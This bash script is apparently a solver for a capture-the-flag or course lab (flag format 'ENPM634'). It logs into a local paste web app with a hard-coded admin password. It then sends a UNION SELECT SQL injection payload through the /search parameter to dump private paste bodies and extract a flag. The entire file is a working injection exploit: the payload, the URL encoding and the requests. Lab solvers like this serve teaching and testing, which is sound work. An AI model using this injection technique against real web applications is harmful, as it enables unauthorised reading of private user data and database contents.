#!/usr/bin/env bash
# Vuln 3: SQL injection in /search — UNION SELECT to read private paste body.
# The SQLi flag is stored as the body of a private paste owned by sql_user.
URL="${1:-http://localhost}"
LOGIN_USER="${2:-admin}"
LOGIN_PASS="${3:-supercalifragilisticexpialidociousandthequickbrownfoxjumpsoverthelazydog}"

COOKIE_JAR="$(mktemp)"
trap 'rm -f "$COOKIE_JAR"' EXIT

# Login to get an authenticated session (search requires login)
curl -sf -c "$COOKIE_JAR" -b "$COOKIE_JAR" \
  -X POST \
  -d "username=${LOGIN_USER}&password=${LOGIN_PASS}" \
  "${URL}/login" -o /dev/null -L 2>/dev/null

# SQLi payload: break out of LIKE, UNION SELECT to read all paste bodies
# The paste table has columns: id, title, body, language, user_id, is_private
PAYLOAD="' UNION SELECT id, title, body, language, user_id, is_private FROM paste WHERE is_private = 1 --"
ENCODED=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''${PAYLOAD}'''))")

RESP=$(curl -sf -b "$COOKIE_JAR" "${URL}/search?q=${ENCODED}" 2>/dev/null)
echo "$RESP" | grep -oE 'ENPM634\{[^}]+\}' | grep -F 'sql_injection' | head -1
